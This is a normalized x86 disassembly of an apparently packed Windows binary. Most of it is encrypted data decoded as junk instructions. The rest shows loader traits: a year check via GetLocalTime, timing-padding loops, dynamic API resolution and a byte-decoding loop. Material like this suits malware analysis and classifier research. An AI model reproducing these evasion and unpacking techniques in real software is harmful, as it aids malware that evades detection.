jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xeb
sbb al 0x97
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa7
jae r-xdata
inc esi
jae r-xdata
fsub [ eax ]
in al dx
outsd
and eax 0x2b681c1c
or dh dl
pop esi
sbb al 0x1c
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ ebp + 0x50 ]
sbb al 0x1c
sbb al 0xb5
loopne r-xdata
sbb al 0x73
jae r-xdata
mov [ 0x60e3e3e0 ] eax
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and ah ch
movaps xmm3 [ si ]
sbb al 0x68
sub ecx [ edx ]
inc esi
sbb [ esp + ebx ] bl
fisub [ edi + 0x61ecfbc7 ]
rcl [ eax ] 0x1
sbb al 0x1c
in al dx
push esp
sub bl [ cs : esp + ebx ]
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
sub ah [ eax ]
jae r-xdata
sbb al 0x1c
in al dx
pop ss
or ah [ edx ]
adc ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
add eax 0x73731c1c
jae r-xdata
pop ss
mov bl 0x89
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop es
push 0x54c30b24
mov ebx esp
sbb al 0x74
dec edi
jecxz r-xdata
push esp
pushad
sbb al 0x1c
jae r-xdata
sbb al 0xda
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
mov ch 0xb3
mov ah 0x1c
and esp [ ebx + 0x1c506d0a ]
and esi [ ebx + 0x751ce389 ]
arpl bx sp
jecxz r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
out 0x6a eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp ebx
jae r-xdata
scasb [ edi ]
int1
push 0xbe6a853c
cmpsd [ esi ] [ edi ]
mov [ ecx - 0x41957a48 ] edx
push 0x3eb50a0f
sbb al 0x1c
test [ edx - 0x42 ] ebp
in eax dx
push 0xbe6a853b
sar [ eax ] 0x1
test [ edx - 0x42 ] ebp
mov bl 0xa
jae r-xdata
sbb esp edx
or dl [ edi ]
jne r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
mov ah 0x6a
daa
jae r-xdata
push esp
daa
sti
and cx [ edx ]
arpl [ ebp + 0x1c ] bx
dec edi
push 0xec1c661b
scasb [ edi ]
sub ebp [ esi - 0x5a ]
dec ebx
or ecx [ ebp + 0x18 ]
sbb al 0x1c
and bp sp
pop ebx
and [ esp + ebx ] ebx
outsb
scasb [ edi ]
pop ebx
outsb
cmpsb [ esi ] [ edi ]
dec ebx
or edi [ eax + 0x18 ]
sbb al 0x1c
and bp sp
sbb al 0x6e
rol [ ebp - 0x44f45996 ] 0x1
or ch al
xor eax 0x73731c1c
jae r-xdata
jae r-xdata
pushad
shl ebx cl
sti
cmp eax 0x73731c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
sbb al 0xec
and [ ebx + 0x73 ] dh
jae r-xdata
fdivr [ esp + ebx ]
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
mov edx 0xaa323d0
push es
jecxz r-xdata
cmp al 0x1c
sbb al 0x68
sbb esp eax
sbb [ edx ] cl
jg r-xdata
inc [ ebp + 0x67ec2366 ]
movsb [ edi ] [ esi ]
jae r-xdata
mov bl 0x1c
jne r-xdata
jecxz r-xdata
pushad

jae r-xdata
sbb al 0x1c
jae r-xdata
mov al [ 0x236685ff ]
jae r-xdata
jne r-xdata
jecxz r-xdata
movsd [ edi ] [ esi ]
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x89
cmp al 0x1c
jae r-xdata
jecxz r-xdata
daa
mov [ 0xffffffff80831d8b ] eax
push cs
mov ah 0x6a
movsd [ edi ] [ esi ]
xor [ ecx ] esp
push 0xffffffa6
pop ebp
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
movsb [ di ] [ si ]
test [ esi + 0x23 ] esp
add eax 0x3ae6a85
mov edx 0xb30ba66e
test [ edx - 0x5a ] ebp
push 0x6a85eba6
scasb [ edi ]
add [ edx ] ecx
inc [ esp + ebx ]
sbb al 0xb
bound ebp [ eax ]
sbb al 0x1c
mov edx 0xa2568ba
or al 0x52
sbb al 0x1c
jae r-xdata
push 0xffffffae
add edi [ edx - 0x4cf45992 ]
sbb esp [ esi + 0x1c ]
in al dx
or edx [ ecx + 0x38 ]
sbb al 0x1c
mov esi [ eax + esi * 8 - 0x3e ]
pop ebp
mov ah 0x6a
movsd [ edi ] [ esi ]
jmp r-xdata
daa
jecxz r-xdata
mov edx [ ebx + 0x5d ]
test al 0x6f
sbb al 0x54
pushad
daa
jae r-xdata
or edi ecx
and bl [ esp + ebx ]
or dl ch
push ds
and ebp esp
mov ebx eax
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] bl
mov ebx [ ebx ]
das
fsubr [ edx - 0x185a954c ]
or esi [ ebp + 0x38 ]
or esp [ esi + 0x38 ]
sbb al 0x1c
std
mov ah 0x6a
movsd [ edi ] [ esi ]
sti
or ebp [ 0xffffffff8b1c1c38 ]
out dx eax
dec esp
and [ edx - 0x4c ] dl
push 0xffffffa5
dec [ ebx ]
and edi [ eax ]
sbb al 0x1c
mov ebp [ esi ]
loope r-xdata
cwde
jae r-xdata
pushad
dec edx
cmp ebx [ esp + ebx ]
jae r-xdata
movsd [ edi ] [ esi ]
out 0xb eax
jne r-xdata
sti
or ch [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb5
jae r-xdata
retn
jae r-xdata
inc edi
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xb4
or al dl
push es
jae r-xdata
and ecx esp
or cl [ edx + 0x731c1c19 ]
jae r-xdata
sbb al 0x1c
mov eax [ ebx - 0x4b2abb9c ]
push 0x65
push ebx
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sub ch ah
jecxz r-xdata
mov ch 0x6e
jae r-xdata
mov bh 0x18
sbb al 0x1c
mov bl 0xb5
or dh dh
or ebx [ esp + ebx ]
jae r-xdata
mov ch 0xb5
jae r-xdata
sbb al 0x1c
jae r-xdata
cmp esp [ edi ]
push 0x65
push edi
jecxz r-xdata
cmp [ esp + ebx ] bl
mov ecx edx
test [ edx - 0x5a ] ebp
or edi [ ebx + 0x1c35e80a ]
sbb al 0x73
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push ebx
imul esp [ esi + 0x3a66b13 ] 0x6b
cmpsb [ esi ] [ edi ]
xor ebp [ ebx - 0x5a ]
and ebp [ esi - 0x52 ]
pop es
outsb
cmpsb [ esi ] [ edi ]
inc edi
and al 0xa6
pop es
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
or esi [ ebp + 0x24b5a8ae ]
cmpsb [ esi ] [ edi ]
xrstor [ eax - 0x59db514b ]
aaa
scasb [ edi ]
mov al [ eax + 0x3ba62491 ]
mov [ eax + 0x2f0a858c ] ss
and eax 0x73731c1c
jae r-xdata
xor al 0x1c
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ ebx ] 0x1c1c383f
mov esp [ edi - 0x68 ]
sbb eax 0xb40e8083
push 0xffffffa5
pushad
test [ eax - 0x27 ] esp
jecxz r-xdata
jecxz r-xdata
in al 0xe3
jae r-xdata
pop ecx
sbb al 0x1c
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
arpl [ esi ] bx
sbb al 0x1c
or bh [ edi + 0x22 ]
sbb al 0x1c
and cx [ edx ]
or dl [ ecx + 0x6 ]
jae r-xdata
and ebp esp
jmp r-xdata
xor eax 0x731c1c38
jae r-xdata
daa
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
sbb esp eax
scasb [ edi ]
mov dh 0x68
lss ecx [ edx ]
dec ecx
add ebx [ esp + ebx ]
jae r-xdata
aaa
xchg edi eax
test [ edx - 0x52 ] ebp
jae r-xdata
mov edx 0x160a9b89
xor eax 0x73731c1c
jae r-xdata
mov esi 0xf50bb42b
or bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
push es
jae r-xdata
mov ch 0xa
test [ ebx ] 0x1c
sbb al 0x73
jae r-xdata
sbb al 0x1c
or dl dh
cmp [ esp + ebx ] ebx
outsb
test [ ecx ] esi
push 0x961cd7a5
test [ ecx ] si
jae r-xdata
jae r-xdata
jae r-xdata
lodsb [ esi ]
out dx eax
sub ch ah
jmp r-xdata
sbb al 0x1c
jae r-xdata
push 0xffffffae
mov esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
or bl al
add ebx [ esp + ebx ]
sbb al 0x73
jae r-xdata
and bp sp
pushad
retn
and ecx [ edx ]
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
xor ebp [ esi - 0x5a ]
xor esi [ ebx + 0x1c51fe0a ]
sbb al 0x73
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
sbb eax 0x8a0a1c1c
sbb eax 0x5b731c1c
popfd
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
pop ebx
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push 0xbe6a853d
jmp 0xffffffff93509dfc
in al dx
push esp
movsd [ edi ] [ esi ]
in eax 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
sar [ ebx ] cl
sbb al 0x1c
jae r-xdata
or ecx [ 0x1c1c1c26 ]
popfd
call [ edx + 0x1c ]
xchg edi eax
or eax 0x1c1c1c26
jae r-xdata
push 0xffffffbe
sub esi [ ebx + ecx + 0x1c1c0af5 ]
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ 0x731c1c59 ]
jae r-xdata
sbb al 0xba
push 0x2a66efac
in al dx
and eax 0x1c52ff0b
mov esp ebx
shl ebx cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
aad 0x1e
jg r-xdata
xlat
mov al 0xb0
outsb
sbb al 0x96
push 0x961ceba6
or bl al
mov ebx esp
push 0x65
aas
jecxz r-xdata
sbb al 0x97
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
mov ah 0x6e
scasb [ edi ]
pop ds
or dh al
pop es
push 0x2a270a0f
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0x6e
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x7751cb0 ]
jecxz r-xdata
mov al 0xb0
mov al 0x6e
jae r-xdata
test [ ebp + 0xaa5a0da ] 0x1c1c59d0
xor esp esp
jae r-xdata
mov dh 0x1f
or ah [ esi ]
push cs
sbb al 0x1c
jae r-xdata
push 0x52ff0b25
sbb al 0x1c
jae r-xdata
jae r-xdata
mov edx 0x66efac68
sub ch ah
in eax 0xb
jae r-xdata
mov ecx [ eax - 0x4f2cac4b ]
pop ds
sbb al 0x1c
or bl [ edx + 0x731c1c1f ]
or ebx [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0xa
fadd [ ebx ]
sbb al 0x1c
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
jae r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov esp ebp
pop ebp
dec eax
jae r-xdata
mov edx [ edx - 0x4f2cac4b ]
push 0xffffffe5
sbb al 0xa
jae r-xdata
sbb al 0x1c
jae r-xdata
mov [ rw-data ] 0x40c4
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jmp r-xdata
sbb al 0x1c
jae r-xdata
0x731c1c1f 0x5b0b
jae r-xdata
mov dh 0x68
mov [ rw-data ] 0x174
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665e4
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
inc [ rw-data ]
cmp [ rw-data ] 0x152f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov ch 0x53
jae r-xdata
cmp ebx [ esp + ebx ]
pop ebx
jae r-xdata
jae r-xdata
mov [ rw-data ] 0x1774
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
mov [ rw-data ] 0x1
jmp r-xdata
retn 0x4
in eax 0x5d
shl [ eax + 0x1c4d1a0a ] cl
jae r-xdata
mov edx 0xaa323d0
cmp eax 0x731c1c24
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8cea
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
nop
nop
mov eax 0x1c750735
call sub_4026bc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
or bl [ edx ]
jae r-xdata
or ecx [ eax + 0x3b ]
jae r-xdata
mov [ rw-data ] 0x1
dec ebp
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
mov ecx 0x73
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sbb al 0x73
jae r-xdata
pop ss
loopne r-xdata
push 0xaee01baa
sbb al 0x8b
jae r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ ebp + 0xab0d353 ] dh
jae r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1c74f007
jne r-xdata
call sub_403198
push ebx
jae r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x1
sbb cl [ ebp + 0x1c ]
mov al 0xa
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8e8b
jne r-xdata
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jae r-xdata
push 0x1f
call sub_4060e8
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_460e24
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0xc
jbe r-xdata
nop
push 0x0
call sub_460eac
nop
nop
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
stosb [ edi ]
sub_4644bc
mov ebx 0xe307751c
jecxz r-xdata
shl [ ebx ] 0x1
mov bl 0xb3
outsb
outsd
mov esp ebx
arpl bx sp
jecxz r-xdata
sbb eax 0x73731c1c
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x66
xchg edi eax
sbb al 0xb5
jae r-xdata
jae r-xdata
jae r-xdata
or al [ esi + 0x5 ]
jae r-xdata
xchg edi eax
or ah [ eax + 0x1d ]
sbb al 0x1c
jae r-xdata
mov edi esp
outsb
cmpsb [ esi ] [ edi ]
pop ds
mov bl 0xa
dec esp
loope r-xdata
jecxz r-xdata
jae r-xdata
mov eax 0x7373202a
cmpsd [ esi ] [ edi ]
jae r-xdata
add eax 0x73731c1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
fisub [ eax - 0xc9a1305 ]
jae r-xdata
jae r-xdata
push 0x63681ba6
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
pushad
lahf
push 0xffffffa7
jae r-xdata
pop di
sbb [ esp + ebx ] ebx
or dl [ ebx + 0x731c1c36 ]
jae r-xdata
and bp sp
pop si
cmpsd [ esi ] [ edi ]
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
sbb ebp [ eax + 0x63 ]
jae r-xdata
add [ esp + ebx ] bl
mov al [ 0xfffffffff365ecfb ]
jae r-xdata
jae r-xdata
inc esi
sub [ esp + ebx ] bh
outsb
jae r-xdata
and ebp esp
jae r-xdata
mov edx [ esi ]
sbb al 0x1c
jae r-xdata
pop es
mov ah 0xb3
in al dx
jae r-xdata
and eax 0x1c0df20b
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
or ah ch
sbb ebx [ esp + ebx ]
out dx al
and ebp ebx
arpl [ edi - 0x1d ] ax
jecxz r-xdata
jae r-xdata
pushad
xchg edi eax
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
mov ah 0x97
jae r-xdata
push 0xffffff9e
jae r-xdata
sbb al 0x1c
xor al 0x3
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
out 0xe3 al
or ch dh
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
pushad
jecxz r-xdata
jae r-xdata
push ebx
push ds
sbb al 0x1c
or ebp [ edx ]
sbb al 0x1c
and bp sp
adc ax 0x9e0a
adc eax 0x73731c1c
sti
jae r-xdata
jae r-xdata
outsb
sbb al 0x6e
cmp al 0x1c
jae r-xdata
or ah [ ebx + ebp * 8 + 0x66ece3e3 ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xdf20b25
jae r-xdata
mov dl 0x1c
xchg esi eax
jae r-xdata
and ecx [ edx ]
in eax 0x1b
sbb al 0x1c
jae r-xdata
add [ gs : esp + ebx ] bl
test [ esi + 0x15 ] esp
or bl [ esi + 0x731c1c15 ]
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
je r-xdata
push 0xb5b0b20f
and [ ecx ] ecx
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
or ch bh
jae r-xdata
jecxz r-xdata
jae r-xdata
or esi edx
jae r-xdata
in al dx
mov dh 0xa
cmpsb [ esi ] [ edi ]
cmp [ esp + ebx ] bl
jae r-xdata
sahf
sub ecx [ edx ]
push ebx
cmp al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
mov edi esp
jecxz r-xdata
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
or al [ eax - 0x1b ]
jecxz r-xdata
sbb al 0x1c
or ch dl
cmp eax 0x73731c1c
sbb al 0x1c
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0xef0a1c1c
jae r-xdata
and ebp ecx
outsb
cmpsd [ esi ] [ edi ]
shl [ ebx ] 0x1
push 0xffffffa7
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
push 0xffffffa6
pop ss
or bl [ esi - 0x49e3e3d4 ]
or al [ ecx + 0x3c ]
sbb al 0x1c
jae r-xdata
or dl [ ebx + 0x3c ]
sbb al 0x1c
mov al 0xa
cmp bh bh
jecxz r-xdata
xor eax 0x961c1c1c
pop ss
sbb al 0xb4
mov bl 0x89
sbb al 0xa

jae r-xdata
xchg esp eax
adc [ ecx + 0x57a62486 ] 0xbb
xchg [ ebp + 0x5ba624b5 ] cl
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah 0xb
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x720a8c89
aaa
jae r-xdata
jae r-xdata
sahf
out dx eax
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
push 0xffffffa6
jae r-xdata
mov bl 0x6a
jae r-xdata
jae r-xdata
push 0xffffff9e
pop ds
sbb al 0xb5
adc ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
xchg [ edx ] cl
jno r-xdata
jpe r-xdata
sahf
sbb al 0x96
jae r-xdata
aas
jae r-xdata
mov ebx esi
outsb
daa
mov bl 0xa
mov ecx 0x731c1c18
jae r-xdata
das
and al 0xa6
jae r-xdata
lahf
jae r-xdata
jae r-xdata
mov [ edx ] cs
jae r-xdata
movsb [ edi ] [ esi ]
jae r-xdata
out dx eax
int3
xor al 0x3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
adc eax 0x85bb8689
push 0xffffffa6
jae r-xdata
xor ebp esp
push esp
pushad
and ah cl
or cl [ edx + 0x731c1c15 ]
jae r-xdata
dec ecx
jmp 0xffffffff88ba2984
imul edx [ ebx - 0x1d ] 0xffffffe3
jae r-xdata
jae r-xdata
cli
mov [ edx + ecx ] ebx
jae r-xdata
sub cl [ edx ]
jae r-xdata
in al dx
sbb al 0x1c
jae r-xdata
jmp r-xdata
xchg esi eax
sbb al 0x1c
mov esp ebx
jecxz r-xdata
push 0xffffff9e
jae r-xdata
jae r-xdata
jecxz r-xdata
mov esi 0xeb280a3b
jae r-xdata
sub bl ch
or esi [ edi ]
mov bl 0x1c
jae r-xdata
mov edx 0x6a85bb89
cmpsb [ esi ] [ edi ]
pop ss
test [ edx - 0x52 ] ebp
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
sbb al 0x73
sbb al 0x1c
jb r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
add ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
out dx eax
jecxz r-xdata
jae r-xdata
pushad
pxor mmx1 [ ecx + 0xd310aeb ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sub bh ch
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov dl 0xb3
test [ edx - 0x59 ] ebp
sub ah [ eax ]
jae r-xdata
add eax 0xf5810abb
jecxz r-xdata
sbb eax [ ebp + 0xa1b9e6a ]
xchg esi eax
jae r-xdata
or bl [ eax + 0x731c1c30 ]
jae r-xdata
or dh [ ecx + 0xf ]
outsb
cmpsb [ esi ] [ edi ]
cmp esi [ ebx + 0x6a3f961c ]
jae r-xdata
sbb al 0x1c
mov [ ebx - 0x7a5b7647 ] ebx
push 0xffffffb6
jns r-xdata
push ds
lahf
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebp + 0x3a260bb3 ]
sbb al 0x1c
mov ch 0x8b
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata

or ch [ eax ]
jae r-xdata
jae r-xdata
scasb [ edi ]
scasb [ edi ]
jae r-xdata
mov bl 0x1c
je r-xdata
xchg di ax
sbb [ esp + ebx ] bl
jae r-xdata
sbb al 0x1c
jecxz r-xdata
mov bl 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
jae r-xdata
jae r-xdata
out 0xa eax
movsb [ edi ] [ esi ]
in al dx
jae r-xdata
sbb al 0xd0
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cld
jae r-xdata
jecxz r-xdata
jae r-xdata
or ah [ edi + ebp * 8 + 0x6e73e3e3 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x1c14060a ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
adc [ esp + ebx ] bl
adc ch [ edi ]
sbb al 0x1c
mov edx 0x66ec2366
pop esi
jecxz r-xdata
jae r-xdata
jae r-xdata
mov eax 0x7373202a
sub ah [ eax ]
jae r-xdata
jae r-xdata
dec edi
push 0xab3eb96
mov dh 0x41
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
mov ecx 0x45ae6a85
mov [ esi + 0x7fb66a85 ] edx
mov ecx 0x7db66a85
test [ edx - 0x5a ] ebp
dec ecx
push 0x8923d035
xchg edi eax
test [ edx - 0x4a ] ebp
inc ecx
jae r-xdata
jae r-xdata
pushad
jae r-xdata
jmp r-xdata
jae r-xdata
outsb
mov ebx 0xf710a86
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
pop edi
jecxz r-xdata
daa
fisttp [ edx ]
inc ebp
xor eax 0x6a851c1c
scasb [ edi ]
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata

jae r-xdata
and ebp [ edx ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
and edi [ ebp + 0x73202ab8 ]
outsb
jae r-xdata
jae r-xdata
and edi [ ebp + edi * 4 + 0x73202ab8 ]
jae r-xdata
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb3
jae r-xdata
push 0xffffffbe
jae r-xdata
cwde
xor [ esp + ebx ] bl
sub cl [ edx ]
jae r-xdata
cmp ecx [ edx ]
fwait
push ds
sbb al 0x1c
mov al 0xb3
or al dh
call 0x73ba2bc4
sbb al 0x74
or esp ebx
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
or bl [ eax - 0x5 ]
jecxz r-xdata
sbb al 0x1c
or ah [ ebx + 0x731c1c10 ]
mov [ ebx + 0x17a66a85 ] edi
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
pushad
mov esp ebx
shl ebx cl
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
sahf
pop ds
in al dx
sbb al 0xf0
jecxz r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
sub esi [ ebx - 0x5f5e377 ]
jae r-xdata
pop ds
or al [ ebp + 0x7373e3e3 ]
jae r-xdata
pop ss
push 0xffffff9e
insd
or al 0x1c
sbb al 0xb2
sbb al 0x96
test [ esi + 0x2a ] esp
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
mov edx ebp
jecxz r-xdata
mov bl 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
outsb
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffae
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x731c1c16 ]
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb esp eax
scasb [ edi ]
pop ds
xor esp edx
loop r-xdata
jae r-xdata
jae r-xdata
mov ah 0xb0
mov ah 0x89
sbb al 0xa
0x731c1c3d 0x7373
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x6e
sahf
cmp ebp [ esi + 0x6e ]
push ebx
push ds
sbb al 0x1c
or ebx [ ecx ]
sub ebx [ esp + ebx ]
and bp sp
pop ds
cmp [ esp + ebx ] ebx
or bh [ eax + 0x731c1c33 ]
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and bp sp
or esi ebx
jae r-xdata
jae r-xdata
add esi [ ebx + 0x1897666e ]
sbb al 0x1c
sub edx [ ecx + 0x24aeb586 ]
and al 0xa6
jae r-xdata
inc ebp
jae r-xdata
or edx eax
and ecx [ edx ]
inc eax
in eax 0xe3
jecxz r-xdata
jae r-xdata
mov dl 0xb0
jae r-xdata
xchg edi eax
sar [ eax ] 0x1
mov al 0x1c
jne r-xdata
jae r-xdata
or bh dl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
jne r-xdata
or ah [ ecx + 0x16 ]
jae r-xdata
jae r-xdata
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jae r-xdata
dec ebp
push 0x2fa66e2d
test [ edx - 0x6a ] ebp
push 0xffffffa6
mov ebx ebp
sbb al 0x1c
shr [ edx ] 0x1
mov [ 0xab42bc8 ] al
push edi
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
out dx eax
mov ch 0xb4
or esp ebx
jae r-xdata
jecxz r-xdata
[ eax - 0x53 ]
jecxz r-xdata
adc al 0x1c
mov ebx eax
test [ edx - 0x5a ] ebp
push esp
jae r-xdata
mov esp 0xa2366bd
push ebp
fmul [ ebx ]
jae r-xdata
jae r-xdata
aaa
push ds
sbb al 0x1c
mov bl 0xb0
push 0x5e
aaa
ja r-xdata
sahf
or esp [ ecx - 0x45e3e3ff ]
jae r-xdata
jecxz r-xdata
loop r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
or al [ eax ]
xor eax 0x73731c1c
jae r-xdata
mov edi 0xb32354ec
jae r-xdata
jae r-xdata
int1
cmp [ esp + ebx ] bl
